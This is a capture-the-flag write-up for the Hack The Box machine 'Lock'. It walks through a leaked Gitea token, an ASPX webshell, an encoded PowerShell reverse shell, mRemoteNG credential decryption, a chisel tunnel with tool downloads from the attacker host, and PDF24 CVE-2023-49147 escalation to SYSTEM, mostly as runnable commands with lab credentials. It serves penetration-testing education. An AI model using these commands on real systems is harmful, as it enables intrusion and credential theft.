# Lock — HTB Writeup

![Windows](https://img.shields.io/badge/OS-Windows-blue)
![Easy](https://img.shields.io/badge/Difficulty-Easy-green)
![Status](https://img.shields.io/badge/Status-Pwned-red)

## Machine Info

| Field | Details |
|-------|---------|
| Name | Lock |
| OS | Windows Server 2022 |
| Difficulty | Easy |
| IP | 10.129.234.64 |
| Author | xct & kozie |

---

## Attack Chain Overview

```
Gitea Public Repo
      ↓
Hardcoded PAT in Git History
      ↓
Private Repo Access (website)
      ↓
CI/CD Git Push → ASPX Webshell on IIS
      ↓
Shell as lock\ellen.freeman
      ↓
mRemoteNG Config Decryption
      ↓
Credentials for gale.dekarios
      ↓
RDP via Chisel Tunnel
      ↓
PDF24 CVE-2023-49147 (Oplock + MSI Repair)
      ↓
SYSTEM
```

---

## Enumeration

### Nmap

```bash
nmap -sV -sC -p 80,3000,3389 10.129.234.64 --min-rate 1000
```

Key findings:
- Port 80 — Microsoft IIS 10.0
- Port 3000 — Gitea 1.21.3
- Port 3389 — RDP (filtered externally)

### Gitea Enumeration

Browsing to `http://10.129.234.64:3000` revealed a self-hosted Gitea instance. Exploring the public repositories exposed a single repo owned by `ellen.freeman`:

```bash
curl -s http://10.129.234.64:3000/api/v1/repos/search?limit=50 | jq '.data[].full_name'
# "ellen.freeman/dev-scripts"
```

---

## Credential Discovery — Git Commit History

The `dev-scripts` repo had two commits. The first commit contained a **hardcoded Personal Access Token** before it was moved to an environment variable:

```bash
curl -s "http://10.129.234.64:3000/api/v1/repos/ellen.freeman/dev-scripts/contents/repos.py\
?ref=dcc869b175a47ff2a2b8171cda55cb82dbddff3d" | jq -r '.content' | base64 -d
```

**Token recovered:**
```
PERSONAL_ACCESS_TOKEN = '43ce39bb0bd6bc489284f2905f033ca467a6362f'
```

---

## Private Repository Access

Using the token we authenticated to the Gitea API and discovered a private repo:

```bash
TOKEN="43ce39bb0bd6bc489284f2905f033ca467a6362f"
curl -s "http://10.129.234.64:3000/api/v1/repos/search?limit=50" \
  -H "Authorization: token $TOKEN" | jq '.data[] | {full_name, private}'
# "ellen.freeman/website" — private: true
```

Cloned the private repo:
```bash
git clone http://ellen.freeman:$TOKEN@10.129.234.64:3000/ellen.freeman/website.git
```

The `readme.md` confirmed a CI/CD pipeline:
> *"CI/CD integration is now active - changes to the repository will automatically be deployed to the webserver"*

---

## Foothold — ASPX Webshell via CI/CD

The repo contents were served directly by IIS on port 80. Since `cmd.aspx` was already in the repo and deployed, we had immediate RCE:

```bash
curl -s "http://10.129.234.64/cmd.aspx?cmd=whoami"
# lock\ellen.freeman
```

Generated a PowerShell reverse shell:
```bash
LHOST=$(ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
PAYLOAD="\$client=New-Object Net.Sockets.TCPClient('$LHOST',4444);\$stream=\$client.GetStream()..."
B64=$(echo -n "$PAYLOAD" | iconv -t UTF-16LE | base64 -w 0)
curl -G "http://10.129.234.64/cmd.aspx" --data-urlencode "cmd=powershell -nop -w hidden -enc $B64"
```

Caught reverse shell as `lock\ellen.freeman`.

---

## Lateral Movement — ellen.freeman → gale.dekarios

### Git Credentials

Found plaintext credentials in `C:\Users\ellen.freeman\.git-credentials`:
```
http://ellen.freeman:YWFrWJk9uButLeqx@localhost:3000
```

### mRemoteNG Password Decryption

Found mRemoteNG configuration at:
```
C:\Users\ellen.freeman\AppData\Roaming\mRemoteNG\confCons.xml
```

The config contained an AES-GCM encrypted RDP password for `Gale.Dekarios`. Decrypted using the default mRemoteNG master key `mR3m`:

```bash
git clone https://github.com/haseebT/mRemoteNG-Decrypt.git /tmp/mremoteng
python3 /tmp/mremoteng/mremoteng_decrypt.py \
  -s "LYaCXJSFaVhirQP9NhJQH1ZwDj1zc9+G5EqWIfpVBy5qCeyyO1vVrOCRxJ/LXe6TmDmr6ZTbNr3Br5oMtLCclw=="
# Password: ty8wnW9qCKDosXo6
```

### RDP via Chisel Tunnel

RDP (3389) was filtered externally. Tunneled through the webshell using chisel:

```bash
# Kali — start chisel server
./chisel server -p 8888 --reverse &

# Upload chisel to target
curl -G "http://10.129.234.64/cmd.aspx" \
  --data-urlencode "cmd=curl http://LHOST:8080/chisel.exe -o C:\Windows\Temp\chisel.exe"

# Trigger reverse tunnel via webshell
curl -G "http://10.129.234.64/cmd.aspx" \
  --data-urlencode "cmd=start /b C:\Windows\Temp\chisel.exe client LHOST:8888 R:3389:127.0.0.1:3389"

# Connect via RDP
xfreerdp /v:127.0.0.1:3389 /u:Gale.Dekarios /p:ty8wnW9qCKDosXo6 /cert:ignore +clipboard
```

**User flag retrieved** from `C:\Users\gale.dekarios\Desktop\user.txt`

---

## Privilege Escalation — PDF24 CVE-2023-49147

PDF24 Creator 11.15.1 was installed on the machine, vulnerable to a local privilege escalation via MSI repair and oplock abuse. The MSI installer was present at `C:\_install\pdf24-creator-11.15.1-x64.msi`.

### Exploitation Steps

**Step 1 — Download SetOpLock utility:**
```cmd
curl http://LHOST:8080/SetOpLock.exe -o C:\Users\gale.dekarios\SetOpLock.exe
```

**Step 2 — Set oplock on PDF24 log file (leave this window running):**
```cmd
C:\Users\gale.dekarios\SetOpLock.exe "C:\Program Files\PDF24\faxPrnInst.log" -r
```

**Step 3 — Trigger MSI repair in a second cmd window:**
```cmd
msiexec.exe /fa C:\_install\pdf24-creator-11.15.1-x64.msi
```

**Step 4 — GUI exploitation:**
1. Click **OK** on the "close applications" dialog
2. `pdf24-PrinterInstall.exe` spawns as **SYSTEM** and gets paused by the oplock
3. Right-click the titlebar of `pdf24-PrinterInstall.exe` → **Properties**
4. Check **"Use legacy console"** → **OK**
5. Firefox appears in the application list → click it
6. Firefox opens → press **Ctrl+O**
7. In the file path bar type `cmd.exe` → **Enter**
8. A SYSTEM shell is obtained

**Root flag retrieved:**
```cmd
whoami
# nt authority\system

type C:\Users\Administrator\Desktop\root.txt
```

---

## Flags

| Flag | Location |
|------|----------|
| User | `C:\Users\gale.dekarios\Desktop\user.txt` |
| Root | `C:\Users\Administrator\Desktop\root.txt` |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning |
| curl / jq | Gitea API enumeration |
| git | Repository cloning and pushing |
| mRemoteNG-Decrypt | Decrypt mRemoteNG saved passwords |
| chisel | TCP tunneling for RDP |
| xfreerdp | RDP client |
| SetOpLock | Oplock for PDF24 exploit |

---

## Key Takeaways

- **Never commit secrets to Git** — even if you remove them in a later commit, the history is permanent and readable
- **mRemoteNG uses a known default encryption key** — stored credentials are trivially decryptable
- **CI/CD pipelines with write access are dangerous** — pushing a webshell to a repo that auto-deploys to a web server gives instant RCE
- **PDF24 CVE-2023-49147** — MSI repair combined with oplock abuse allows privilege escalation to SYSTEM from a standard user account
